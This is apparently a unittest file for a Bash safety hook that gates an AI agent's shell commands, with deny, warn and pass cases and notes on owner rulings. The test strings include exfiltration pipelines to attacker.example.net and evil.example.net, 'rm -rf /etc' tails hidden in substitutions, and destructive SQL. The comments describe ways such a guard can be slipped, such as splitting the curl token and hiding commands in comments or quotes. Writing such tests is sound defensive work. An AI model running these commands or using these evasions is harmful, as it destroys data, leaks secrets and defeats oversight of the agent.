"""Smoke tests for bash-safety-guard.py: PreToolUse on Bash.

Minimal coverage of: the dangerous-pattern deny path, the benign-pass path,
the Windows-reserved-filename guard, and the inert-context-stripping
prefilter (rm -rf inside a python -c string should NOT be blocked).
"""

from __future__ import annotations

import importlib.util
import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).parent))

_spec = importlib.util.spec_from_file_location(
    "bash_safety_guard",
    str(Path(__file__).parent / "bash-safety-guard.py"),
)
bsg = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(bsg)


def _run(payload: dict) -> tuple[int, str]:
    captured = io.StringIO()
    payload_str = json.dumps(payload)
    with mock.patch.object(sys, "stdin", io.StringIO(payload_str)), \
         redirect_stdout(captured):
        rc = bsg.main() if hasattr(bsg, "main") else 0
    return rc, captured.getvalue()


class InertContextStripTests(unittest.TestCase):
    def test_strips_python_dash_c_double_quoted(self):
        cleaned = bsg.strip_inert_contexts('python -c "rm -rf /" ')
        self.assertNotIn("rm -rf /", cleaned)

    def test_strips_grep_pattern(self):
        cleaned = bsg.strip_inert_contexts("grep 'force-push' log.txt")
        self.assertNotIn("force-push", cleaned)

    def test_strips_echo(self):
        cleaned = bsg.strip_inert_contexts('echo "rm -rf /"')
        self.assertNotIn("rm -rf /", cleaned)

    def test_leaves_real_command_intact(self):
        cleaned = bsg.strip_inert_contexts("ls -la /tmp")
        self.assertIn("ls -la /tmp", cleaned)

    def test_strips_trailing_hash_comment(self):
        # QA finding 2026-06-16: a SQL keyword in a `#` comment was reaching the
        # patterns. The comment must be stripped before matching.
        cleaned = bsg.strip_inert_contexts("ls -la # TODO: DROP TABLE staging later")
        self.assertNotIn("DROP TABLE", cleaned)
        self.assertIn("ls -la", cleaned)

    def test_hash_inside_double_quotes_is_not_a_comment(self):
        # Security invariant: `#` inside quotes is literal: a substitution after it
        # still executes, so it must NOT be stripped.
        cleaned = bsg.strip_inert_contexts('mycmd "label # rm -rf /etc"')
        self.assertIn("rm -rf /etc", cleaned)

    def test_hash_midword_is_not_a_comment(self):
        # `#` not preceded by whitespace (e.g. a URL fragment) is literal, not a comment.
        cleaned = bsg.strip_inert_contexts("curl https://api.example.com/x#frag")
        self.assertIn("api.example.com/x#frag", cleaned)


class MainFlowTests(unittest.TestCase):
    def test_safe_command_passes_silently(self):
        rc, out = _run({"tool_name": "Bash", "tool_input": {"command": "ls -la"}})
        self.assertIn(rc, (None, 0))
        self.assertEqual(out, "")

    def test_python_c_with_rm_rf_inside_string_passes(self):
        # rm -rf is inside a python -c literal: not actually executed
        rc, out = _run({
            "tool_name": "Bash",
            "tool_input": {"command": 'python -c "print(\'rm -rf /\')"'},
        })
        self.assertIn(rc, (None, 0))
        self.assertEqual(out, "")

    def test_non_bash_tool_passes(self):
        rc, out = _run({
            "tool_name": "Read",
            "tool_input": {"file_path": "/tmp/x"},
        })
        self.assertIn(rc, (None, 0))
        self.assertEqual(out, "")

    def test_empty_payload_fails_open(self):
        captured = io.StringIO()
        with mock.patch.object(sys, "stdin", io.StringIO("")), \
             redirect_stdout(captured):
            rc = bsg.main() if hasattr(bsg, "main") else 0
        # Should not raise; either returns 0 or returns None silently
        self.assertIn(rc, (None, 0))
        self.assertEqual(captured.getvalue(), "")

    def test_malformed_json_fails_open(self):
        captured = io.StringIO()
        with mock.patch.object(sys, "stdin", io.StringIO("not json")), \
             redirect_stdout(captured):
            rc = bsg.main() if hasattr(bsg, "main") else 0
        self.assertIn(rc, (None, 0))


def _decision(out: str):
    """Return permissionDecision string from a hook stdout, or None if silent/pass."""
    if not out.strip():
        return None
    try:
        return json.loads(out)["hookSpecificOutput"]["permissionDecision"]
    except Exception:
        return None


def _reason(out: str) -> str:
    try:
        return json.loads(out)["hookSpecificOutput"]["permissionDecisionReason"]
    except Exception:
        return ""


class TwoGateIrreversibleBashTests(unittest.TestCase):
    """Gate-1 irreversible-surface deny patterns (two-gate build 2026-06-16).
    Each pattern carries a true-positive (must DENY) and a false-positive guard
    (must PASS). Patterns sourced from _irreversible_surface.IRREVERSIBLE_BASH_PATTERNS."""

    def _deny(self, command):
        _, out = _run({"tool_name": "Bash", "tool_input": {"command": command}})
        self.assertEqual(_decision(out), "deny", f"expected DENY for: {command!r}")
        return out

    def _pass(self, command):
        _, out = _run({"tool_name": "Bash", "tool_input": {"command": command}})
        self.assertIsNone(_decision(out), f"expected PASS for: {command!r} (got {out!r})")

    def _warn(self, command):
        """Permitted, but carrying a caution (owner ruling 2026-08-05, normal push).

        Deliberately distinct from _pass: a warn must actually SAY something. A
        silent allow would satisfy "not blocked" while losing the reminder the
        ruling asked for, so the reason text is asserted, not just the decision.
        """
        _, out = _run({"tool_name": "Bash", "tool_input": {"command": command}})
        self.assertEqual(_decision(out), "allow", f"expected WARN+ALLOW for: {command!r}")
        self.assertIn("warning, not a block", _reason(out),
                      f"warn carried no caution text for: {command!r}")
        return out

    # --- P1: unflagged relative single-file rm ---
    def test_p1_tp_unflagged_relative_rm_denies(self):
        self._deny("rm important-notes.md")

    def test_p1_fp_guards_pass(self):
        self._pass("rm -rf /tmp/scratch")          # /tmp allowed
        self._pass("rm /tmp/x")                      # absolute /tmp allowed
        self._pass('echo "rm notes.md"')            # inert-stripped
        self._pass('git commit -m "rm stale notes"')  # -m message inert-stripped
        self._pass("rmdir emptydir")                 # rmdir is not rm

    def test_p1_fp_windows_absolute_paths_pass(self):
        # Regression (review 2026-06-16): a Windows absolute path is the analog of a
        # leading-/ absolute path (1a's domain), NOT a relative file (P1's domain).
        # The old (?!/) guard wrongly denied them because '"' / a drive letter is not '/'.
        self._pass('rm "C:/Users/exampleuser/file.py"')   # quoted, forward slash
        self._pass("rm 'C:/Users/x/file.py'")                  # single-quoted
        self._pass('rm "D:\\\\data\\\\scratch.tmp"')           # quoted, backslash
        self._pass("rm D:/data/scratch.tmp")                   # unquoted Windows abs

    # --- P2: normal (non-force) git push ---
    def test_p2_tp_normal_push_warns_not_denies(self):
        # CHANGED 2026-08-05 by the owner's ruling. This asserted a hard deny, on the
        # theory that the human gate was him re-running the push himself via the
        # `!`-prefix bypass. In practice the command he pasted was the one the agent
        # had just composed and handed him verbatim, so no decision moved to a human;
        # it only cost a round trip. A normal push is additive and revertable, unlike
        # the force-push below, which still denies.
        self._warn("git push origin main")

    def test_p2_tp_global_flags_before_push_warn(self):
        # Regression (review 2026-06-16): a git GLOBAL option between `git` and `push`
        # broke the old `\bgit\s+push\b` adjacency and let the push through SILENTLY.
        # The pattern still has to match every one of these; what changed 2026-08-05
        # is the verdict, deny -> warn. A silent pass here would be the original bug.
        self._warn("git -C /path push")
        self._warn("git --no-pager push")
        self._warn("git -c user.email=x push")
        self._warn("git -c a=b -c c=d push origin main")

    def test_p2_fp_guards_pass(self):
        self._pass("git log -n 5")
        self._pass("git status")
        self._pass('git commit -m "mention git push in message"')  # inert-stripped
        self._pass("git diff -- push.txt")          # push.txt is a path arg, not the subcommand
        self._pass("git diff HEAD push.txt")        # same: no global-flag chain reaches `push`
        self._pass("git branch push-feature")       # branch name, not the push subcommand

    def test_p2_force_push_keeps_force_description(self):
        # Ordering: the EXISTING force-push block is above P2, so --force / -f keep
        # their own description (deny either way; fidelity matters for the log).
        self.assertIn("force-push", _reason(self._deny("git push --force origin main")).lower())
        self.assertIn("force-push", _reason(self._deny("git push -f")).lower())

    # --- P3: DB destructive DDL/DML ---
    def test_p3_tp_destructive_sql_denies(self):
        self._deny('psql -c "DROP TABLE users"')
        self._deny('psql -c "TRUNCATE orders"')
        self._deny('psql -c "DELETE FROM logs"')
        self._deny("DELETE FROM logs;")

    def test_p3_tp_multistatement_delete_denies(self):
        # Regression (review 2026-06-16): the WHERE lookahead used `.*`, which scanned
        # past the `;` and found WHERE in a LATER statement, suppressing the deny on the
        # unbounded DELETE. [^;]* scopes the guard to the current statement segment.
        self._deny("DELETE FROM logs; SELECT * FROM t WHERE id=1")
        self._deny("DELETE FROM logs ; UPDATE other SET x=1 WHERE id=2")

    def test_p3_fp_guards_pass(self):
        self._pass('psql -c "DELETE FROM logs WHERE id=1"')   # bounded delete
        self._pass('psql -c "SELECT * FROM drop_log"')        # drop_log identifier, not DROP
        self._pass("truncate -s 0 server.log")                # coreutils truncate (flagged)

    # --- P4: external curl write (curl_external_write predicate, replaces old regex) ---
    # TESTING GOTCHA (mandatory): the literal curl token must NOT sit on a literal Bash
    # command line in this file (a Bash hook lint-scan of the test file would otherwise
    # trip the live guard). Assemble every trigger string at runtime via concatenation.
    _C = "cur" + "l"

    def test_p4_tp_clean_external_writes_deny(self):
        c = self._C
        out = self._deny(f"{c} -X POST https://api.example.com/x -d " + "'{}'")
        self.assertIn("external curl write", _reason(out).lower())
        self._deny(f"{c} -X PUT https://api.example.com/x")
        self._deny(f"{c} -X PATCH https://api.example.com/x")
        self._deny(f"{c} -X DELETE https://api.example.com/resource/1")
        self._deny(f"{c} --request PUT https://api.example.com/y")

    def test_p4_tp_incidental_localhost_remote_writes_deny(self):
        # The exact defect (pentest wf_aeee55d3-224 HIGH #B): a loopback token in a
        # NON-target position (query / path / header value / -d body / referer) must
        # NOT suppress the deny on a genuine remote write. All 6 must DENY.
        c = self._C
        self._deny(f"{c} -X POST https://api.example.com/x?ref=localhost-test")      # query param
        self._deny(f"{c} -X POST https://api.example.com/localhost-callback")        # path segment
        self._deny(f'{c} -X POST https://api.example.com/x -H "Origin: http://localhost:3000"')  # header
        self._deny(f'{c} -X POST https://api.example.com/x -d "host=localhost"')     # body
        self._deny(f'{c} -X POST https://api.example.com/x -H "X-Forwarded-For: 127.0.0.1"')     # header
        self._deny(f"{c} -X POST https://api.example.com/x --referer http://localhost/")          # referer

    def test_p4_tp_schemeless_and_implicit_post_deny(self):
        c = self._C
        self._deny(f"{c} -X POST api.example.com/x")          # scheme-less external target
        self._deny(f"{c} --data x https://api.example.com/y")  # implicit POST (no -X), remote

    def test_p4_json_flag_implicit_post(self):
        # QA #B follow-up (2026-06-17): curl 7.82+ `--json` is a POST+body shorthand that
        # was absent from the flag sets, so a remote --json write was silently allowed
        # (adversarial-reviewer under-block). Must DENY remote, ALLOW loopback.
        c = self._C
        self._deny(f"{c} --json " + "'{}'" + " https://api.example.com/x")   # remote JSON POST
        self._pass(f"{c} --json " + "'{}'" + " http://localhost:5678/x")     # loopback JSON POST

    def test_p4_fp_loopback_targets_and_reads_pass(self):
        c = self._C
        self._pass(f"{c} -X POST http://localhost:5678/webhook")   # loopback target
        self._pass(f"{c} -X POST http://127.0.0.1:8080/x")         # loopback IP target
        self._pass(f"{c} -d x http://localhost:5678/rest")         # loopback target, body flag
        self._pass(f"{c} -X GET https://api.example.com/y")        # explicit GET (read)
        self._pass(f"{c} https://api.example.com/y")               # GET default, no body/method

    def test_p4_tp_glued_short_bundle_remote_writes_deny(self):
        # Review under-block (2026-06-17): a glued short-option bundle where -X (or a
        # body flag) is NOT the first flag was silently passed because only tok[:2] was
        # inspected. The bundle walker must find the embedded value-taking flag.
        # `--fail --silent --show-error -X DELETE` collapses to `-fsSXDELETE` in the wild.
        c = self._C
        self._deny(f"{c} -sSXDELETE https://api.example.com/resource/1")  # -s -S -X DELETE
        self._deny(f"{c} -fXPUT https://api.example.com/x")               # -f -X PUT
        self._deny(f"{c} -kXPATCH https://api.example.com/x")             # -k -X PATCH
        self._deny(f"{c} -sSXPOST https://api.example.com/x")             # -s -S -X POST
        self._deny(f"{c} -fsSXDELETE https://api.example.com/x")          # -f -s -S -X DELETE
        self._deny(f"{c} -XPOST https://api.example.com/x")               # -X glued, first flag
        self._deny(f"{c} -sSX DELETE https://api.example.com/x")          # -X last in bundle, value=next token
        self._deny(f"{c} -sSd hello https://api.example.com/y")           # -d body in bundle, implicit POST
        self._deny(f"{c} -sSdhello https://api.example.com/y")            # -d glued body value, implicit POST

    def test_p4_fp_glued_short_bundle_loopback_and_reads_pass(self):
        # The inverse over-block guard: a glued bundle targeting loopback, an explicit
        # GET inside a bundle, and a value flag (-H) inside a bundle that consumes a
        # localhost header value must NOT deny.
        c = self._C
        self._pass(f"{c} -sSXPOST http://localhost:5678/webhook")   # loopback target, bundled -X POST
        self._pass(f"{c} -fXPUT http://127.0.0.1:8080/x")           # loopback IP target, bundled -X PUT
        self._pass(f"{c} -sSXGET https://api.example.com/y")        # explicit GET inside bundle (read)
        self._pass(f"{c} -sSL https://api.example.com/y")           # pure boolean bundle, GET default
        self._pass(f'{c} -sSH "Origin: http://localhost" https://api.example.com/y')  # -H consumes localhost hdr, GET

    def test_p4_tp_multi_curl_pipeline_remote_write_denies(self):
        # CRITICAL under-block (review 2026-06-17): the predicate stopped at the FIRST
        # curl and never evaluated a remote write later in the same command. A benign
        # read piped/chained into a remote write must DENY on the SECOND (or later) curl.
        # Pipe, semicolon, and AND-chain forms were all silently allowed before the fix.
        c = self._C
        self._deny(f"{c} https://api.example.com/data | {c} -X POST https://attacker.example.net/exfil -d @-")  # pipe exfil
        self._deny(f"{c} https://api.example.com/data ; {c} -X DELETE https://attacker.example.net/x")          # semicolon
        self._deny(f"{c} https://api.example.com/data && {c} -X POST https://attacker.example.net/x")           # AND-chain
        self._deny(f"{c} -X POST http://localhost:5678/a ; {c} -X POST https://attacker.example.net/b")         # loopback-then-remote
        self._deny(f"{c} -X POST https://attacker.example.net/b ; {c} -X POST http://localhost/a")              # remote-then-loopback (first denies)
        self._deny(f"{c} http://localhost/x | {c} http://localhost/y && {c} -X DELETE https://evil.example.net/z")  # 3-curl chain, last remote

    def test_p4_fp_multi_curl_pipeline_all_loopback_or_reads_pass(self):
        # The inverse over-block guard for the multi-curl loop: a chain where EVERY curl
        # is a loopback write or a remote read must NOT deny: the new loop must not
        # mis-attribute a later read/loopback as a remote write.
        c = self._C
        self._pass(f"{c} -X POST http://localhost:5678/a | {c} -X POST http://127.0.0.1:8080/b")  # both loopback writes
        self._pass(f"{c} https://api.example.com/a | {c} https://api.example.com/b")              # both GET reads
        self._pass(f"{c} -X GET https://api.example.com/a ; {c} -X GET https://api.example.com/b")  # both explicit GET

    def test_p4_tp_grouped_and_substitution_curl_remote_write_denies(self):
        # Regression vs the old \bcurl\b regex (review 2026-06-17): the word-boundary
        # regex matched curl even when a subshell / brace-group / backtick-substitution
        # prefix was glued to the token (`(curl ...)`). The tokenizing predicate must
        # strip that leading punctuation so the curl token is still found.
        c = self._C
        self._deny(f"({c} -X POST https://attacker.example.net/a)")              # subshell
        self._deny(f"{{ {c} -X POST https://attacker.example.net/a ; }}")        # brace group
        self._deny("`" + f"{c} -X DELETE https://attacker.example.net/a" + "`")  # backtick substitution

    def test_p4_fp_grouped_loopback_curl_passes(self):
        # Inverse over-block guard: a subshell-wrapped loopback write must NOT deny.
        c = self._C
        self._pass(f"({c} -X POST http://localhost:5678/a)")

    # --- P5: prod deploy ---
    def test_p5_tp_prod_deploy_denies(self):
        self._deny("docker compose up -d")
        self._deny("docker build -t awards-api:latest .")
        self._deny("git archive HEAD | ssh root@203.0.113.10 'tar -xf -'")
        # 2026-06-18: real prod deploys named by file must STILL deny (the build-oracle
        # exemption is keyed to the -p example-build-oracle project, not to compose-up itself).
        self._deny("docker compose -f docker-compose.example-ui.yml up -d")
        self._deny("docker compose -f docker-compose.embed.yml up -d")
        # segment-scoped: the exemption token in a LATER segment must NOT exempt a prod up.
        self._deny("docker compose -f docker-compose.example-ui.yml up ; echo -p example-build-oracle")

    def test_p5_fp_guards_pass(self):
        self._pass("docker ps")
        self._pass("docker logs awards-api")
        self._pass("docker compose logs backup")          # 'backup' contains 'up' but not \bup\b
        self._pass("git archive HEAD -o local.tar")       # no ssh pipe
        self._pass("docker build -t myimg:v1.2 .")        # versioned tag, not :latest

    def test_p5_fp_build_oracle_isolated_stage_passes(self):
        # 2026-06-18 exemption (owner: "the guard is too harsh"): the isolated, reversible
        # build-oracle stage (-p example-build-oracle, throwaway DB, down -v) is the opposite
        # of a prod deploy and MUST be allowed; the real prod deploys above still deny.
        self._pass("docker compose -p example-build-oracle -f docker-compose.build-oracle.yml up --exit-code-from tests --abort-on-container-exit")
        self._pass("cd /opt/example-app && docker compose -p example-build-oracle -f docker-compose.build-oracle.yml down -v ; docker compose -p example-build-oracle -f docker-compose.build-oracle.yml up --exit-code-from tests --abort-on-container-exit ; docker compose -p example-build-oracle -f docker-compose.build-oracle.yml down -v")
        self._pass("docker compose -p example-build-oracle -f docker-compose.build-oracle.yml build")  # build subcommand, not a P5 up

    # --- comment false-positive guard (QA finding 2026-06-16) ---
    def test_sql_keyword_in_trailing_comment_passes(self):
        # The exact cases QA falsified: destructive keyword sits in a `#` comment,
        # so it never executes and must NOT be denied.
        self._pass("ls -la # TODO: DROP TABLE staging later")
        self._pass("git status # note: DELETE FROM logs eventually")
        self._pass("docker ps # remember to rm old-image.tar afterwards")

    def test_dangerous_command_before_comment_still_denies(self):
        # The comment strip must only remove text AFTER the marker: a real command
        # before the `#` is still scanned and blocked.
        self._deny("DROP TABLE users # cleanup task")
        # Normal push warns rather than denies since 2026-08-05, but the point this
        # test defends is unchanged: the command BEFORE the `#` must still be seen.
        # A silent pass here would mean the comment strip had eaten it.
        self._warn("git push origin main # ship it")

    def test_hash_inside_quotes_does_not_hide_destructive_command(self):
        # Security invariant: `#` inside double quotes is literal, so a destructive
        # command after it is live and must STILL be denied (no under-block hole).
        self._deny('mycmd "label # $(rm -rf /etc)"')

    def test_substitution_with_comment_then_destructive_tail_still_denies(self):
        # Review 2026-06-16: comment-stripping must NOT hide a `; cmd` tail that bash
        # executes after a command/process substitution closes. Empirically the
        # backtick and $'...' forms DO execute the tail: these were real under-block
        # holes introduced by the first comment-strip cut. The substitution-unsafe
        # bail-out leaves the whole command scannable so the tail is still caught.
        self._deny("y=`echo hi # info`; rm -rf /etc")        # backtick subst (confirmed exec)
        self._deny("x=$'\\' # note'; rm -rf /etc")            # $'...' ANSI-C (confirmed exec)
        self._deny("z=$(echo hi # msg); rm -rf /etc")         # $(...) (defense-in-depth)
        self._deny("diff <(cat /dev/null # n); rm -rf /etc")  # <(...) (defense-in-depth)

    def test_import_still_clean_after_extend(self):
        # bash-safety-guard must still import and carry the extended pattern list.
        # The old P4 curl regex was removed (now a predicate, not a BLOCKED_PATTERNS
        # entry), so the appended count dropped 9 -> 8. Then 2026-08-05 the normal
        # git-push pattern moved OUT of BLOCKED_PATTERNS into WARN_PATTERNS per
        # the owner's ruling, dropping the floor one further, 25 -> 24.
        self.assertGreaterEqual(len(bsg.BLOCKED_PATTERNS), 17 + 7)
        # The push pattern must have MOVED, not been deleted. Losing it entirely
        # would make a push silent, which is the outcome the ruling explicitly did
        # not ask for: it asked for a reminder, not for nothing.
        self.assertEqual(len(bsg.WARN_PATTERNS), 1)
        self.assertIn("git push", bsg.WARN_PATTERNS[0][1])
        self.assertNotIn(bsg.WARN_PATTERNS[0][1], [d for _, d in bsg.BLOCKED_PATTERNS])
        # And the curl predicate is importable + wired (no curl regex remains).
        self.assertTrue(hasattr(bsg, "curl_external_write"))


class FamilyCDenyCalibrationTests(unittest.TestCase):
    """Family-C Gate-1 deny-pattern calibration (Fixes A + B, ratified by owner
    2026-07-15). Encodes the mandatory deny/pass matrix from the implementation plan
    [[2026-07-15-family-c-deny-calibration-plan]] / review
    [[2026-07-14-family-c-deny-calibration-review]].

    Fix A narrows "rm -rf on current directory" (bash-safety-guard BLOCKED_PATTERNS,
    the pre-Two-Gate rm tuple) so `rm -f .dotfile` / `rm -f .git/hooks/pre-commit` /
    `rm -rf .hidden-name` no longer false-positive-deny, while `rm -rf .` / `rm -rf ./`
    still DENY. Fix B widens the non-tmp exemption from `(?!tmp)` to
    `(?!(?:[a-z]/)?tmp/)` so MSYS `/c/tmp/` and `/d/tmp/` are exempt alongside `/tmp/`,
    without exempting `/c/tmpdata/`.

    Declarative-first: this class is authored BEFORE the pattern edit; the "MUST now
    PASS" cases are expected to FAIL against the un-patched hook (proving the tests are
    load-bearing). This is a Gate-1 FLOOR calibration: every "MUST still DENY" case is
    a floor invariant that must survive both edits."""

    def _deny(self, command):
        _, out = _run({"tool_name": "Bash", "tool_input": {"command": command}})
        self.assertEqual(_decision(out), "deny", f"expected DENY for: {command!r}")
        return out

    def _pass(self, command):
        _, out = _run({"tool_name": "Bash", "tool_input": {"command": command}})
        self.assertIsNone(_decision(out), f"expected PASS for: {command!r} (got {out!r})")

    # --- Fix A: MUST still DENY (current-directory floor invariants) ---
    def test_fixA_floor_current_dir_still_denies(self):
        # `rm -rf ./subdir` MOVED to the allow side on 2026-08-24, by the owner's ruling
        # on the bash-guard threat model (recorded in the owner decision brief, item 2:
        # "accidental self-harm"). It was listed here alongside `.` and `./`, but this
        # test's own rationale block below covers only the PARENT-directory cases; the
        # subdir line carried no separate justification. Under the ruled model, deleting
        # a NAMED subdirectory is ordinary work: `rm -rf subdir` has always been allowed,
        # and denying only the `./` spelling of the same delete was the inconsistency the
        # ruling was asked about. The floor itself is untouched: `.`, `./`, `..`, `../`
        # and anything reached through `..` all still deny, asserted here and in
        # test_fixA_floor_parent_dir_still_denies.
        self._deny("rm -rf .")
        self._deny("rm -rf ./")
        _, _sub = _run({"tool_name": "Bash", "tool_input": {"command": "rm -rf ./subdir"}})
        self.assertIsNone(_decision(_sub), "expected PASS for: 'rm -rf ./subdir' "
                          "(ruled 2026-08-24, see the note above)")
        self._deny("rm -rf . && echo done")

    # --- Fix A: MUST still DENY (parent-directory floor invariant) ---
    def test_fixA_floor_parent_dir_still_denies(self):
        # Floor hole caught during the adversarial floor-integrity pass (build 2026-07-15):
        # the FIRST-ratified Fix A regex `\.\s*(?:[^a-zA-Z.]|$)` excluded a trailing dot to
        # spare dotfiles, but `..` (parent dir) is also dot-then-dot, so `rm -rf ..` /
        # `rm -rf ../y` slipped through to PASS: a genuine irreversible-surface floor hole
        # (P1 does not catch them; they carry a `-` flag). The shipped regex
        # `\.(?![a-zA-Z])` denies the dot unless it is immediately followed by a LETTER,
        # so `..`, `.`, `./` all still DENY while dotfile names still PASS.
        self._deny("rm -rf ..")
        self._deny("rm -rf ../")
        self._deny("rm -rf ../y")
        self._deny("rm -rf ../../x")
        self._deny("rm -f ..")
        self._deny("rm -r ../sibling")

    # --- Fix A: MUST now PASS (dotfile / dotdir un-block) ---
    def test_fixA_dotfile_cleanup_now_passes(self):
        self._pass("rm -f .dotfile")
        self._pass("rm -f .git/hooks/pre-commit")
        self._pass("rm -rf .hidden-name")
        self._pass("rm -f .claude/hooks/foo.py")
        self._pass("rm -rf .config/app")

    # --- Fix B: MUST still DENY (non-tmp floor invariants) ---
    def test_fixB_floor_non_tmp_still_denies(self):
        self._deny("rm -rf /home/user/foo")
        self._deny("rm -rf /etc")
        self._deny("rm -rf /c/Users/exampleuser/foo")
        self._deny("rm -rf /c/tmpdata/foo")   # tmpdata is NOT tmp/

    # --- Fix B: MUST now PASS (MSYS drive-mount tmp un-block) ---
    def test_fixB_msys_drive_tmp_now_passes(self):
        self._pass("rm -rf /c/tmp/foo")
        self._pass("rm -rf /d/tmp/scratch")

    # --- Fix B: regression guard: plain /tmp/ stays exempt ---
    def test_fixB_plain_tmp_stays_exempt(self):
        self._pass("rm -rf /tmp/foo")


class FailOpenHardeningTests(unittest.TestCase):
    """GAP-11 (2026-07-10): if _irreversible_surface fails to import, the guard must
    (a) emit a loud gate1_surface_degraded alarm (governance-log JSONL + stderr) and
    (b) enforce the FROZEN fallback snapshot: never an empty pattern list."""

    class _BlockSurfaceImport:
        """meta_path finder that forces ImportError for _irreversible_surface."""

        def find_spec(self, name, path=None, target=None):
            if name == "_irreversible_surface":
                raise ImportError("forced by FailOpenHardeningTests")
            return None

    def _load_degraded_module(self, tmp_log: str):
        """Load a FRESH bash-safety-guard module instance with the canonical surface
        module import forced to fail, alarm log redirected to tmp_log. Returns
        (module, captured_stderr)."""
        blocker = self._BlockSurfaceImport()
        saved = sys.modules.pop("_irreversible_surface", None)
        sys.meta_path.insert(0, blocker)
        stderr_cap = io.StringIO()
        try:
            with mock.patch.dict(os.environ, {"GATE1_ALARM_LOG_PATH": tmp_log}), \
                 redirect_stderr(stderr_cap):
                spec = importlib.util.spec_from_file_location(
                    "bash_safety_guard_degraded",
                    str(Path(__file__).parent / "bash-safety-guard.py"),
                )
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
        finally:
            sys.meta_path.remove(blocker)
            if saved is not None:
                sys.modules["_irreversible_surface"] = saved
        return mod, stderr_cap.getvalue()

    def test_degraded_import_alarms_and_falls_back_nonempty(self):
        with tempfile.TemporaryDirectory() as td:
            tmp_log = os.path.join(td, "governance-log.jsonl")
            mod, err = self._load_degraded_module(tmp_log)
            # (a) gate1_surface_degraded alarm landed in the TEMP governance log
            self.assertTrue(os.path.exists(tmp_log), "no alarm entry was written")
            with open(tmp_log, encoding="utf-8") as f:
                entries = [json.loads(line) for line in f if line.strip()]
            degraded = [e for e in entries if e.get("event") == "gate1_surface_degraded"]
            self.assertGreaterEqual(len(degraded), 1)
            self.assertEqual(degraded[0].get("hook"), "bash-safety-guard")
            self.assertEqual(degraded[0].get("schema"), 2)
            # stderr warning is loud
            self.assertIn("FROZEN fallback", err)
            # (b) the effective pattern list is NON-EMPTY: never falls back to []
            self.assertTrue(mod.IRREVERSIBLE_BASH_PATTERNS,
                            "fallback resolved to an empty pattern list")
            self.assertEqual(mod.IRREVERSIBLE_BASH_PATTERNS,
                             mod._IRREVERSIBLE_FALLBACK_SNAPSHOT)
            # and the frozen P1 rule reached BLOCKED_PATTERNS
            self.assertTrue(any("rm on unflagged relative file" in desc
                                for _, desc in mod.BLOCKED_PATTERNS))

    def test_degraded_module_still_denies_p1_relative_rm(self):
        with tempfile.TemporaryDirectory() as td:
            tmp_log = os.path.join(td, "governance-log.jsonl")
            mod, _err = self._load_degraded_module(tmp_log)
            payload = {"tool_input": {"command": "rm notes.md"}}
            captured = io.StringIO()
            with mock.patch.object(sys, "stdin", io.StringIO(json.dumps(payload))), \
                 redirect_stdout(captured):
                mod.main()
            out = captured.getvalue()
            self.assertIn('"permissionDecision": "deny"', out)
            self.assertIn("rm on unflagged relative file", out)


if __name__ == "__main__":
    unittest.main()
